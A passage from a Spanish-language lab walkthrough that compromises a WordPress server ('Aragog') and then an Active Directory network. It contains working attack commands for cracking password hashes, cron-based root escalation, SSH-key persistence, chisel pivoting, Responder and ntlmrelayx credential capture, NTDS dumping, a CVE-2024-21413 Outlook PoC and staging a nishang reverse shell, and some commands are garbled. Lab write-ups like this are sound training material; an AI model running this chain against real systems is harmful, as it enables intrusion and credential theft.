if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')
    $_SERVER['HTTPS'] = 'on';

require_once(ABSPATH . 'wp-settings.php');
?>
```

Observamos que el archivo nombra un `“/etc/wordpress/config-default.php"`, lo que garemos será investigarlo al no estar seguros de lo que contiene y no queremos perder nada, utilizareos el comando `pushd /etc/wordpress/` al hacerlo nos encontramos el archivo htacces que es el que no nos permite tener directory listing en la web y el archivo por el que hemos venido llamado “config-default.php”. Si le hacemos un cat encontramos que tenemos unas credenciales.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F0E7aUY6QBLKIAZ59mlUa%2Fimage.png?alt=media&amp;token=ec8e1534-e264-4bc0-8115-21d3de6d03c0" alt=""><figcaption></figcaption></figure>

> Normalmente en wordpress se utiliza un archivo llamado wp-config.php para configurar La base de datos con las entradas. También se configura la caché, correo electrónico idioma cookies de sesión, etc...

En este caso como es otro archivo config sobreentiendo que es la contraseña para una base de datos, empezaremos por la más típica `mysql` y para saber si existe simplemente haremos un `ps aux` y filtraremos por `mysql`

```
ps aux | grep mysql
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FveY8OkyPKLzSInpFmfPk%2Fimage.png?alt=media&amp;token=b6de4267-ec94-4fce-aaba-fcf2503a08e8" alt=""><figcaption></figcaption></figure>

En este caso encontramos que estamos frente a mysql así que vamos a intentar loguearnos

Si ponemos `mysql` nos dice que nuestro usuario no tiene acceso y si hacemos ,`mysql –help` nos muestra parámetros que nos permite cambiar el usuario el cuál nos logueamos y contraseña. Así que seguido pondremos este comando

```
mysql -uroot -p
```

Una vez logueados vamos a ver que bases de datos tenemos, utilizando el comadno `show databases;`, entramos a la base de datos de WordPress ya que el sitio está montado en WordPress, ejecuntando `show tables;`.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FzaB8ux2HN2vPaJSsBml8%2Fimage.png?alt=media&amp;token=3a41407d-57df-4d76-91fc-1c643b1176bc" alt=""><figcaption></figcaption></figure>

Dentro de esta tenemos varias tablas, vamos a entrar a la de wp\_users, si hacemos un `describe wp_users` para ver sus columnas obtenemos lo siguiente:

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FLADEe6VRvhzpAwvjhxeW%2Fimage.png?alt=media&amp;token=72474d5d-833c-44b1-89ac-a18825f695e4" alt=""><figcaption></figcaption></figure>

Listaremos lo que hay dentro.

```
SELECT * FROM wp_users;
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FubM73kAgj4FgWt1ZW0Ss%2Fimage.png?alt=media&amp;token=e9c931f8-b70e-4800-9f6a-6680dbcf12db" alt=""><figcaption></figcaption></figure>

Si nos fijamos bien vemos que la contraseña del usuario hagrid98 esta en hash, lo sabemos ya que inicia con un `$P$` ya que es un formato característico de sistemas como PHP y WordPress. Intentaremos llevarlo al directorio `/Resources/Credentials` y lo metemos en un archivo llamado `hash`.

```
mkdir Resources
cd !$
mkdir Credentials
cd !$
```

```
nvim hash
cat hash
```

Una vez aquí dentro vamos a utilizar una herramienta llamada `john` junto al diccionario `rockyou` que se encuentra en la ruta absoluta `/usr/share/wordlists/rockyou.txt`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FzpKWLoFc8HPqOcyaWnk2%2Fimage.png?alt=media&amp;token=171a096c-a66e-4f04-9089-27b799eae5a2" alt=""><figcaption></figcaption></figure>

![](https://visma.gitbook.io/visma/~gitbook/image?url=https%3A%2F%2Fgithub.com%2FVicctoriaa%2FVISMA%2Fassets%2F153718557%2F5c6498e2-d327-4a7b-90bc-bf3905c418af\&width=768\&dpr=4\&quality=100\&sign=99547560\&sv=2)

Podemos ver que la herramienta John the Ripper ha encontrado la contraseña de `hagrid98` (`password123`). Una vez obtenidas las credenciales me conecté por SSH:

```
ssh hagrid98@IP_DE_LA_ARAGOG
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fg7xCrGHBbbcCCI8AVmBF%2Fimage.png?alt=media&amp;token=c965879b-7670-4ccf-8e5a-f02cc93b5924" alt=""><figcaption></figcaption></figure>

> Vemos que nos deja conectarnos, es importante poner la contraseña que encontramos anteriormente y no la de nuestra máquina.

#### Escalada de privilegios <a href="#escalada-de-privilegios" id="escalada-de-privilegios"></a>

Debemos intentar escalar privilegios ya sea a root o a ginny (asi tiene mas privilegios), lo primero que vamos a hacer es revisar si hay algún archivo con permisos

(4000), ejecutamos el siguiente comando para ver que permisos tenemos.

```
find / -perm -4000 2>/dev/null
```

No hemos encontrado nada, así que ahora vamos a buscar scripts de los que seamos propietarios:

```
find / -user hagrid98 2>/dev/null
```

Encontramos que casi todos son de rutas de procesos del sistema o cosas parecidas, pero hay un archivo en el directorio `/opt/`que llama la atención porque aparte de encontrarse en el path es un script en bash donde el owner es hagrid98

Al parecer mueve todo de un directorio a otro, no creo que vaya a ejecutarlo a mano ya que sinó no se haría el script así que vamos a suponer que es una tarea cron y como hagrid98 no tiene tareas cron pues la tarea cron es ejecutada por root o ginny, así que vamos a agregarle una línea donde hagamos que /bin/bash se convierta en suid y así saber si es root el que está ejecutando la tarea.

```
cat /opt/.backup.sh
```

```
watch -n 1 ls -l
```

Vemos que si esta en root, al saber que ya tenemmos la ruta con permisos SUID, ejecutamos `bash -p`, nos permitirá ejecutar la bash como el owner. Observamos lo siguiente:![](https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F9Zrmb2f6jX5II8PfW0yd%2Fimage.png?alt=media\&token=9e944a48-6252-4924-93ea-06131d89825d)

Si abrimos la ultima flag que vemos, con el comando `cat horcrux2.txt`nos da la enhorabuena 😊👍 Ya que hemos conseguido vulnerar la máquina por completo. Si queremos entrar las veces que queramos sin contraseña, lo explicamos en el siguiente punto.

#### Persistencia <a href="#entrar-sin-contrasena" id="entrar-sin-contrasena"></a>

Creamos una clave publica en nuestro equipo de ssh y la meteremos dentro del directorio `/root/.ssh`

```
sudo nano id_rsa.pub
```

Una vez creada quitamos el salto de línea del archivo `/root/.ssh/id_rsa.pub`, ejecuntamos el siguiente comando:

```
cat ~/.ssh/id_rsa.pub | tr -d '\n'
```

Y lo copiamos al portapapeles

```
cat ~/.ssh/id_rsa.pub | tr -d '\n' | xclip -sel clip
```

Abrimos con nano un archivo llamado ".ssh/authorized\_keys" y pegamos la clave (máquina victima)

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FiLldoMPXMzwexp0hUFHL%2Fimage.png?alt=media&amp;token=7c3232e9-1aa0-4075-b3c6-2dde7d537377" alt=""><figcaption></figcaption></figure>

Ya tenemos acceso, podemos conectarnos como root\@IP\_DE\_LA\_ARAGOG, una vez que tenemos persistencia, vamos a generar un tunel TCP que nos permite llegar al otro segmento de red donde se encuentra el Active Directory.

### Chisel <a href="#chisel" id="chisel"></a>

Para ello, primero debemos clonarnos el repositorio de la herramienta en nuestra máquina.

```
git clone https://github.com/jpillora/chisel.git
```

Una vez clonado, lo extraemos, le damos permisos de ejecución y le cambiamos el nombre a chisel para que sea mas facil manejarlo.

```
gzip -d chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
mv chisel_1.9.1_linux_amd64 chisel
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FwZr0TfwReH5hPb4SE9vh%2Fimage.png?alt=media&amp;token=9db31576-1b42-4657-9491-17a4db730ec7" alt=""><figcaption></figcaption></figure>

Una vez lo tenemos, desde la conexión ssh que tenemos con la aragog, creamos una nueva carpeta en tmp y nos metemos dentroo.

```
cd $(mktemp -d)
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FRFhxBYEuNfG1kVcEoNVa%2Fimage.png?alt=media&amp;token=136e510f-4538-4479-8095-471779fed42a" alt=""><figcaption></figcaption></figure>

Ahora pasamos el script de chisel a la maquina Aragog

```
scp chisel root@<ip de la aragog>:/tmp/<dir>
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Frgz9W50RHOHJzVAtD3AO%2Fimage.png?alt=media&amp;token=fc9bf3af-8544-4113-8149-a481dba92949" alt=""><figcaption></figcaption></figure>

Si ahora hacemos un ls en la Aragog, encontramos que lo tenemos

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FG4P7g60iJ3zv1Ir3FKLp%2Fimage.avif?alt=media&amp;token=d4a65d55-d4ab-4151-87bd-3f6537866e33" alt=""><figcaption></figcaption></figure>

Ahora vamos a iniciar el servidor en nuestra maquina

```
./chisel server --reverse -p 1234
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FyrqlXfF1cxstutuiFemF%2Fimage.png?alt=media&amp;token=5c0fcb62-99c2-4d0e-a0d9-8424491d6402" alt=""><figcaption></figcaption></figure>

y en la Aragog el cliente

```
./chisel client <la_ip_de_la_maquina_atacante>:1234 R:socks
#Al poner R:socks, nos permite traer "toda la red" a la que no tenemos acceso.
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F3MTIe9qUNBSy5uV6iaLv%2Fimage.png?alt=media&amp;token=5de5ea50-8498-44ad-bee8-2cfe128edc0c" alt=""><figcaption></figcaption></figure>

Así se ve el servidor cuando se ha establecido la conexión.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FWCCkzSOTDr4V29AK5d7l%2Fimage.png?alt=media&amp;token=c8e200b5-e773-416b-8410-17b94f65da7a" alt=""><figcaption></figcaption></figure>

Como podemos ver, se ha creado un servidor proxy de tipo socks5 de manera local en nuestro pc por el puerto 1080, por lo que para poder usarlo, hay que usar una herramienta llamada 'proxychains' esta nos permite enviar trafico mediante proxys, para configurarlo debemos modificar un archivo

```
nano /etc/proxychains4.conf
```

Una vez dentro, nos vamos a la ultima linea y comentamos el que viene por defecto y añadimos el nuevo.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F0pmgverqjVYvxsHWl7f6%2Fimage.png?alt=media&amp;token=fcef1bb8-d409-4753-8c41-6ac21f4e6f29" alt=""><figcaption></figcaption></figure>

Una vez lo tenemos hecho, ya podemos empezar por la enumeración del Active Directory.

# Active Directory

#### Enumeración <a href="#enumeracion" id="enumeracion"></a>

Como ya hemos seteado el servidor proxy hacia el otro segmento de red, primero, tenemos que saber cuales son los segmentos de red a los que la Aragog pertenece.

```
hostname -I
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FNAE0iKQjoPsShghjOTML%2Fimage.png?alt=media&amp;token=940ae984-d7c2-4731-b905-83af0617d04a" alt=""><figcaption></figcaption></figure>

Encontramos que el otro segmento de red es la 192.168.2.0/24, con ip 192.168.2.43, por lo que si hacemos un diagrama de red rápido, se debería ver de esta manera:

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FrH0Y74fxSQ4oKFbrHvEb%2Fimage.avif?alt=media&amp;token=0852b452-7f60-4445-870c-8c6dc547f4c8" alt=""><figcaption></figcaption></figure>

Una vez vemos visualmente como es, toca enumerar el otro segmento de red.

```
proxychains crackmapexec smb 192.168.2.0/24 --gen-relay-list relay.list 2>/dev/null
# Mediante crackmapexec añadiéndole el parámetro ‘smb’ y el segmento de ip, podemos hacer una búsqueda por smb a dispositivos.
# Al añadir '2>/dev/null' hacemos que proxychains no nos muestre su output, manteniendolo más limpio
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FsaFhCFHfQnH5fBs6CjxM%2Fimage.avif?alt=media&amp;token=bcad389b-c0fb-4ba5-9503-0ec0fd1c7157" alt=""><figcaption></figcaption></figure>

Una vez encontramos todos los dispositivos, le añadiremos el parámetro “—relay-gen-list” con el nombre “relay.list”, esto hará que todas las ip que encuentre las meterá a un archivo relay.list. Esto nos servirá mas adelante para el ntlmrelay. No podemos usar el responder con proxychains, ya que este requiere estar conectado a la red donde se encuentra el smb directamente.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FzMkypLz7rxCg0LqqsJt4%2Fimage.avif?alt=media&amp;token=c6482d30-462c-413a-8e44-ecd33059d55d" alt=""><figcaption></figcaption></figure>

Por lo que por esa razón vamos a copiar la versión que tenemos en la máquina (en el caso de que lo tengamos), lo comprimimos y se lo pasamos por scp a la maquina aragog.

```
sudo cp -r /usr/share/responder .
sudo zip responder.zip ./responder/* # primero va el output que queremos y después el origen.
scp responder.zip root@<ip_de_la_aragog>:/tmp/<dir>
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fw0Ku5npAJK45d7ufXvox%2Fimage.avif?alt=media&amp;token=daafb7aa-c9a7-4945-91c7-e81ceba44305" alt=""><figcaption></figcaption></figure>

Lo que deberemos hacer será descomprimirlo, entraremos al directorio y lo ejecutamos.

```
unzip responder.zip
cd responder/
responder -I <internet interface> -wd
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FRYv4BxuS998FIQT1m3gD%2Fimage.png?alt=media&amp;token=c465805a-5e64-40ed-a89a-2b9bc91a5f1c" alt=""><figcaption></figcaption></figure>

Encontramos que la máquina ISMA-PC tiene una tarea programada, para acceder a un recurso compartido en red llamado \\\MYSQLServer , pero este no esta disponible.

Como el recurso no está disponible, el script “responde” al DC diciédole que es el, el recurso compartido, de esta manera que el cliente acaba autenticándose contra nosotros y así recibiendo su hash NTLMv2. Conseguimos el hash de el usuario 'iabjijalazhari'

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FLeUU7mN5ymU24OLacXGo%2Fimage.png?alt=media&amp;token=f1cd60f7-ac52-4dde-b701-8a0936f76ecd" alt=""><figcaption></figcaption></figure>

Copiamos el hash, lo metemos dentro de un archivo y junto a john lo rompemos por fuerza bruta.

```
nano hashisma # metemos el hash aqui
john --wordlist=/usr/share/wordlists/rockyou.txt hashisma
cat hashisma
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FEU9XHImeDqXcyV1FbywX%2Fimage.avif?alt=media&amp;token=cb2efe8e-1d2c-46f6-86a7-2c05b7c55cf9" alt=""><figcaption></figcaption></figure>

Al añadir el parámetro “—wordlist=’’”, le damos acceso a un diccionario que por fuerza bruta nos ayudará a romperlo y finalmente encontrar que la contraseña es “baseball1?”.

Una vez tenemos la contraseña, con la ayuda de `crackmapexec` ejecutamos un `passwordspraying`, encontramos que el usuario es válido para login y adémas somos administrador en el equipo ‘192.168.2.41’.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FICJB8JjU0xZYzO3yfV2k%2Fimage.avif?alt=media&amp;token=a7829f73-696c-45a3-af1f-5d9479229343" alt=""><figcaption></figcaption></figure>

Hacemos un escaneo de puertos con nmap sobre el DC

```
proxychains nmap -sT -T5 --min-rate 5000 -Pn -n -p- 192.168.2.253 2>/dev/null
```

Encontramos que tiene el puerto 110 y el 587 (correo) abiertos, por lo que intentaremos enviar un correo, para ello nos aprovecharemos de una vulnerabilidad con Outlook:

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FV7efrOntZZQEoRCAb6cR%2Fimage.avif?alt=media&amp;token=f9db6a8b-62d7-4658-ba2b-ab78d4eb480b" alt=""><figcaption></figcaption></figure>

Por lo que buscamos el POC (Proof of concept) que se encuentra en este github, `https://github.com/duy-31/CVE-2024-21413`, y copiamos el repositorio a nuestro directorio actual de trabajo.

```
git clone https://github.com/duy-31/CVE-2024-21413
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FZniyAdQjlrFYdwIlRXx8%2Fimage.png?alt=media&amp;token=510b4485-1fbf-4318-9dd1-d1be1e476837" alt=""><figcaption></figcaption></figure>

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fc4ESOWLtVoaO2yVGvFu5%2Fimage.png?alt=media&amp;token=16e159e0-1f6e-4fa5-8366-981af2eb6c0f" alt=""><figcaption></figcaption></figure>

Abrimos el .sh y modificamos el html, con el comando `sudo nano cve-2024-21413.sh` para asi se muestre lo que nosotros queremos que se vea.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FCjhdVxYKHBaldJVlvn1l%2Fimage.avif?alt=media&amp;token=261efc79-978d-49d6-a751-79c5c8477339" alt=""><figcaption></figcaption></figure>

Lo ejecutamos y vemos que nos pide iniciar sesión, por lo que vamos a probar con las credenciales que ya tenemos, para ello debemos convertir tanto como el usuario como la contraseña en base64 (aunque lo podemos hacer por consola, en este caso usarémos la herramienta cyberchef ya que es mas visual).

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FLFCOVemxdIAD890Wvc1R%2Fimage.avif?alt=media&amp;token=35a1c347-5a6e-482c-ae12-ff628629b6fa" alt=""><figcaption></figcaption></figure>

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Fw2XEzWabSR29PrWHdhLX%2Fimage.avif?alt=media&amp;token=b97650c2-e4a3-43b3-8e3e-50b1554378d0" alt=""><figcaption></figcaption></figure>

Una vez lo tenemos modificamos el código de que pueda loguearse

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2Ft0aa7GHiy3VxD8vZu79O%2Fimage.avif?alt=media&amp;token=ebff8e8c-6848-41da-af5a-24f2312aa3e4" alt=""><figcaption></figcaption></figure>

Después de haber modificado el código no funciona, por lo que usaremos el código de base para hacerlo a mano, por lo que nos conectamos con proxychains por telnet a la ip del DC.

```
proxychains telnet 192.168.2.253 25
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F2rrFzkLmqiU8WOC8LPzR%2Fimage.avif?alt=media&amp;token=800b22c6-0921-42e1-a745-5a8d2e6a974b" alt=""><figcaption></figcaption></figure>

Dejamos la terminal del responder abierta y una vez se nos abra por completo conseguimos el hash NTLMv2 de vcondeperez.

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F3Wj9B9yji8uubT57CLdv%2Fimage.avif?alt=media&amp;token=e1a7f8e0-14e1-4798-90d3-48bd6829673b" alt=""><figcaption></figcaption></figure>

Aquí se puede observar como se vería el correo de la víctima:

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FvH5JGDNOGxvH83pgA8Er%2Fimage.avif?alt=media&amp;token=a1a75c4c-3458-47a7-b226-9fd6f21a05e7" alt=""><figcaption></figcaption></figure>

De lo que se trata esta vulnerabilidad es básicamente que Outlook no te pregunta si quieres abrir el enlace, ya que por ejemplo `thunderbird` si que te pregunta antes de abrirlo. Se vería así al abrirlo:

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F6v2qP1TBcyKngmZbQXwn%2Fimage.avif?alt=media&amp;token=42b425e1-cddc-4f2d-9315-6d43635000fd" alt=""><figcaption></figcaption></figure>

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2F4dBdp23QcL6hYv65JoUz%2Fimage.png?alt=media&amp;token=cd15aebd-efb6-43c8-a4b0-bbfc339ec065" alt=""><figcaption></figcaption></figure>

Una vez crackeada la contraseña al hacer un --show hashes, podemos ver la contraseña almacenada en memoria.

Una vez tenemos el usuario y credenciales de estos usuarios, vamos a enumerar otros usuarios dentro del dominio para ver si encontramos algo. Para ello emplearemos una herramienta llamada rpcclient, este se comunica mediante RPC con los equipos, el RPC es un protocolo que permite a un programa en una maquina solicitar un servicio de un programa ubicado en otra maquina en una red sin tener que entender los detalles de la red. Esencialmente, RPC permite a un programa ejecutar un procedimiento o codigo en un sistema remoto como si estuviera ejecutándose localmente.

```
proxychains rpcclient -U 'visma.local\iabjijalazhari%baseball1?' 192.168.2.253 -c 'enumdomusers' 2>/dev/null
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FP1VcnqxmagHpVp2WsHLx%2Fimage.avif?alt=media&amp;token=6c66abc3-a97f-4ed0-86ab-2f6102a94867" alt=""><figcaption></figcaption></figure>

Encontramos un usuario llamdo test, como nos llama la atención, vamos a enumerar mas de este mismo

```
proxychains rpcclient -U 'visma.local\iabjijalazhari%baseball1?' 192.168.2.253 -c 'queryuser 0x456' 2>/dev/null
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FZ7tw2QHdBuI97Jxa9o97%2Fimage.avif?alt=media&amp;token=3fb09cad-7b33-40f3-be03-7132eb42de02" alt=""><figcaption></figcaption></figure>

Encontramos que el usuario con la contraseña expuesta en texto claro, este usuario pertenece al grupo 0x201, vamos a buscar quien mas pertenece a este.

```
for rid in $(proxychains rpcclient -U '(dominio)\(usuario)%contraseña' 192.168.2.253 -c 'endomusers' 2>/dev/null | grep -oP '\[.*?\]* | grep '0x' | tr -d '[]'); do echo -e "\n[+] para el Rid $rid\n"; proxychains rpcclient -U (dominio)\(usuario)%contraseña' 192.168.2.253 -c 'queryuser' $rid" 2>/dev/null ;donde | grep -vE 'Home|Dir|Profile|Logon|Workstations|Comment|remote|off|Password|padding|logon|bad|fields
```

En nuestro caso en dominio hemos puesto \`visma.local\`, en usuario \`iabjijalazhari\` y en contraseá la que nos dio anteriormente \`baseball1?\` tal que quedaria asi: \`'vimsa.local\iabjijalazhari%baseball1?'\`

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FvhmAfpDUichIOY8aFYgq%2Fimage.avif?alt=media&amp;token=65e8c6f4-ea40-48ed-b34d-2b111b64f7e9" alt=""><figcaption></figcaption></figure>

Encontramos que el usuario “administrator” pertenece también al grupo con rid 0x201 por lo que nos da a entender que el usuario test es un usuario administrador.

Hacemos un password spraying y encontramos que nos aparece Pnwd! En todos, eso quiere decir que tenemos permisos de administrador en todos los dispositivos

```
 proxychains crackmapexec smb 192.168.2.0/24 -u 'test' -p 'P$$w0rd' 2>/dev/null | grep -v 'wisma'
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FqdJPpDepVsGd7FMHaafl%2Fimage.avif?alt=media&amp;token=65c9db5c-311b-4aa9-9768-6ff085cff267" alt=""><figcaption></figcaption></figure>

Dumpeamos el ntdss por si acaso

```
proxychains crackmapexec smb 192.168.2.253 -u 'test' -p 'P$$w0rd'--ntdss 2>/dev/null
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FqqQb9uIqTc6y7PhQdn8w%2Fimage.avif?alt=media&amp;token=7043ce70-c64b-4502-a6f1-0ef2d113e444" alt=""><figcaption></figcaption></figure>

Metemos el hash de Administrator en un archivo y lo rompemos con john (hay que indicarle el formato ya que este no es un NTLMv2), encontramos que la contraseña es `baseball1*`

```
nano samadmin
john --wordlist=/usr/share/wordlists/rockyou.txt samadmin --format=NT
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FiL5rlxIuqne3BNjgCEfr%2Fimage.avif?alt=media&amp;token=5261d9d0-685e-4cbe-814d-149447df9083" alt=""><figcaption></figcaption></figure>

Habilitamos el rdp en todas las maquinas

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FeuzngNuNRz6CgDzQfy3U%2Fimage.avif?alt=media&amp;token=2520334a-502f-473f-8a61-6863a6ef5ce2" alt=""><figcaption></figcaption></figure>

Una vez habilitado, debemos deshabilitar el `Permitir solo las conexiones desde equipos que ejecuten Escritorio remoto con Autenticación a nivel de red` ya que en nuestra maquina atacante no tenemos kerberos instalado ni configurado con el dominio, vamos a usar otro vector de ataque para conseguir una reverse shell y deshabilitarlo.

Para ello setearemos el responder con el HTTP y SMB desactivados.

```
nano /Responder.conf
python2 Responder.py -I <ethernet-interface> -wdv
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FJNSIkPku1uQThRPoCfSL%2Fimage.png?alt=media&amp;token=79efa21b-c020-4a79-b809-953375ce0803" alt=""><figcaption></figcaption></figure>

Paramos el servicio de apache2 ya que la herramienta ntlmrelay de la suite de impacket, usará ese puerto.

```
service apache2 stop
python3 examples/ntlmrelayx.py -tf ../relay.list -smb2support
```

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FrolW1alCBpFsoUD5v2Nc%2Fimage.avif?alt=media&amp;token=c05c38a2-ccd9-47df-97da-592db8ad843f" alt=""><figcaption></figcaption></figure>

Nos mantenemos en escucha y lo que hará el ntlm relay es conseguir un hash NTLMv2, aprovechar estas credenciales y dumpear la SAM (El administrador de cuentas de seguridad o SAM es una base de datos​ almacenada como un fichero del registro en Windows NT) de alguno de los dispositivos dentro de la relay.list

<figure><img src="https://818657019-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuM2fhMp0j7Q5I6745I05%2Fuploads%2FTxAEu7SYKeBICtegEx06%2Fimage.avif?alt=media&amp;token=4816b25b-f872-4127-a852-8936f93b935d" alt=""><figcaption></figcaption></figure>

Esto es lo que hace por default, pero también podemos decirle que aproveche esas credenciales para inyectar codigo a un equipo.

Usaremos un script para reverse shell de [nishang](https://github.com/samratashok/nishang). Le cambiamos el nombre a PS.ps1 y lo pasamos a la Aragog

```
ls
cd Shells
cp Invoke-PowerShellTcp.ps1 PS.ps1
sudo scp PS.ps1 root@<aragog-ip>:/tmp/<dir>
```

